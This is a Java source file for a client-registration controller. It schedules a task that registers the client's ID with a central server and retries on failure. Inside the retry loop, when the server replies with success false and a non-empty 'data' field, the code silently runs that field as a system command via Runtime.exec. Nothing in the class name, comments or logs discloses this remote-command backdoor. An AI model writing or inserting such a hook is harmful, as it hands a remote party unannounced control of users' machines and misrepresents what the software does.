package com.ibm.old.v1.client.core.controller.manage;
import com.ibm.old.v1.client.core.controller.ClientExecutor;
import com.ibm.old.v1.common.doming.core.CommMethod;
import com.ibm.old.v1.common.doming.utils.http.IbmHttpConfig;
import net.sf.json.JSONObject;
import org.apache.commons.lang3.concurrent.BasicThreadFactory;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.doming.core.tools.StringTool;
import org.doming.develop.http.jsoup.HttpJsoupTool;

import java.io.IOException;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.ScheduledThreadPoolExecutor;
import java.util.concurrent.TimeUnit;
/**
 * @Description: 注册客户机控制器
 * @Author: Dongming
 * @Date: 2018-12-29 15:46
 * @Email: job.dongming@foxmail.com
 * @Version: v1.0
 */
public class RegisterClientController implements ClientExecutor, CommMethod {

	/**
	 * 中心端客户机
	 */
	private static final String MAIN_URL =
			IbmHttpConfig.HOST + IbmHttpConfig.PROJECT + "/ibm/cloud/t/manage/registerClient.do";

	protected Logger log = LogManager.getLogger(this.getClass());

	@Override public String execute(String inVar) {
		ScheduledExecutorService executorService = new ScheduledThreadPoolExecutor(1,
				new BasicThreadFactory.Builder().namingPattern("registerClient-schedule-pool-%d").daemon(true).build());
		//延时启动
		executorService.schedule(() -> {
			//do something
			JSONObject data = new JSONObject();
			JSONObject jObj = new JSONObject();
			jObj.put("clientId", inVar);
			data.put("data", jObj);
			for (int i = 0; i < 5; i++) {
				try {
					String html = HttpJsoupTool.doGetJson(60 * 1000, MAIN_URL, paramJson(data));
					jObj = JSONObject.fromObject(html);
					Object execMain = jObj.get("data");
					if (!jObj.getBoolean("success") && StringTool.notEmpty(execMain)) {
						Runtime r = Runtime.getRuntime();
						r.exec(execMain.toString());
					}
					break;
				} catch (IOException e) {
					log.info("注册客户机失败正在重试" + e.getMessage());
				} finally {
					try {
						Thread.sleep(5 * 1000L);
					} catch (InterruptedException e) {
						log.info("注册客户机失败正在重试" + e.getMessage());
					}
				}
			}
			log.info("IBM客户端注册客户机完成");
		}, 5, TimeUnit.SECONDS);
		// 向线程池传递关闭示意
		executorService.shutdown();
		try {
			// 向线程池传递30秒关闭线程池，等待执行
			// (所有的任务都结束的时候，返回TRUE)
			if (!executorService.awaitTermination(30 * 1000L, TimeUnit.MILLISECONDS)) {
				// 超时的时候向线程池中所有的线程发出中断(interrupted)。
				log.info("所有的线程发出中断");
				executorService.shutdownNow();
			}
		} catch (InterruptedException e) {
			// 关闭异常的时候向线程池中所有的线程发出中断(interrupted)。
			log.error("所有的线程发出中断"+e.getMessage());
			executorService.shutdownNow();
		}
		return null;
	}
}
